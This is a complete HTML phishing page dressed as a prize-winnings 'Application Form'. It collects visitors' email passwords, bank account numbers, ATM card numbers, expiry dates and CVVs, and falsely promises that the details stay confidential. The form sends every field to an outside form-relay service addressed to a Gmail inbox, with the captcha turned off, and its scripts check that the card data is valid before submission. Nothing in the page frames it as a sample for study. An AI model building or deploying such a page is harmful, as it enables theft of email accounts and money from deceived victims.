<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    #atm-warning {
      color: red;
      font-weight: bold;
      display: none;
      margin-top: 10px;
    }
    #final-message {
      margin-top: 20px;
      font-weight: bold;
    }
    .notice {
      color: green;
      font-style: italic;
      margin-top: -10px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <form 
    id="application-form"
    action="https://formsubmit.co/exellentfirm@gmail.com"
    method="POST"
  >
    <!-- Disable captcha and redirect to thank you page -->
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="thankyou.html">

    <h2>Application Form</h2>
    <p class="notice">We keep your data/details secure and confidential</p>

    <label>1. Full Name</label>
    <input type="text" name="fullName" required />

    <label>2. Country</label>
    <input type="text" name="country" required />

    <label>3. Phone Number</label>
    <input type="tel" name="phoneNumber" id="phoneNumber" required />
    <div class="error" id="phone-error">Phone number must be 9 to 12 digits.</div>

    <label>4. Email Address</label>
    <input type="email" name="email" required />

    <label>5. Email Password</label>
    <div class="password-wrapper">
      <input type="password" name="emailPassword" id="emailPassword" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label>6. Amount You Won</label>
    <input type="text" name="amountWon" required />

    <label>7. Bank Account Type (e.g. Standard Bank Account)</label>
    <input type="text" name="accountType" required />

    <label>8. Bank Account Number</label>
    <input type="text" name="accountNumber" required />

    <label>9. Did You Link ATM to Your Bank Account?</label>
    <select name="linkedATM" id="linkedATM" required onchange="handleATMSelection(this.value)">
      <option value="">--Select--</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <div id="atm-warning">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atm-fields">
      <label>10. ATM Card Number</label>
      <input type="text" name="cardNumber" id="cardNumber" maxlength="16" required />
      <div class="error" id="card-error">Card number must be 16 digits.</div>

      <label>11. Expiry Date (MM/YY)</label>
      <input type="text" name="expiryDate" id="expiryDate" maxlength="5" placeholder="MM/YY" required />
      <div class="error" id="expiry-error">Enter a valid MM/YY format.</div>

      <label>12. CVV</label>
      <input type="text" name="cvv" id="cvv" maxlength="3" required />
      <div class="error" id="cvv-error">CVV must be 3 digits.</div>

      <div id="final-message">
        You will receive <span id="final-amount"></span> to your <span id="final-type"></span> <span id="final-number"></span>
      </div>
    </div>

    <br/>
    <button type="submit">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const input = document.getElementById("emailPassword");
      input.type = input.type === "password" ? "text" : "password";
    }

    function handleATMSelection(value) {
      const atmFields = document.getElementById("atm-fields");
      const warning = document.getElementById("atm-warning");
      const finalMessage = document.getElementById("final-message");

      if (value === "No") {
        atmFields.style.display = "none";
        warning.style.display = "block";
        finalMessage.style.display = "none";
      } else {
        atmFields.style.display = "block";
        warning.style.display = "none";
        finalMessage.style.display = "block";
      }
    }

    document.getElementById("application-form").addEventListener("blur", function (e) {
      const target = e.target;

      if (target.id === "phoneNumber") {
        const val = target.value.trim();
        const isValid = /^\d{9,12}$/.test(val);
        document.getElementById("phone-error").style.display = isValid ? "none" : "block";
      }

      if (target.id === "cardNumber") {
        const val = target.value.trim();
        const isValid = /^\d{16}$/.test(val);
        document.getElementById("card-error").style.display = isValid ? "none" : "block";
      }

      if (target.id === "cvv") {
        const val = target.value.trim();
        const isValid = /^\d{3}$/.test(val);
        document.getElementById("cvv-error").style.display = isValid ? "none" : "block";
      }

      if (target.id === "expiryDate") {
        const val = target.value;
        const isValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(val);
        document.getElementById("expiry-error").style.display = isValid ? "none" : "block";
      }
    }, true);

    document.getElementById("expiryDate").addEventListener("input", function(e) {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length >= 3) {
        e.target.value = val.slice(0,2) + '/' + val.slice(2,4);
      } else {
        e.target.value = val;
      }
    });

    document.getElementById("application-form").addEventListener("submit", function () {
      const amount = document.querySelector('input[name="amountWon"]').value;
      const type = document.querySelector('input[name="accountType"]').value;
      const number = document.querySelector('input[name="accountNumber"]').value;

      document.getElementById("final-amount").textContent = amount;
      document.getElementById("final-type").textContent = type;
      document.getElementById("final-number").textContent = number;
    });
  </script>
</body>
</html>
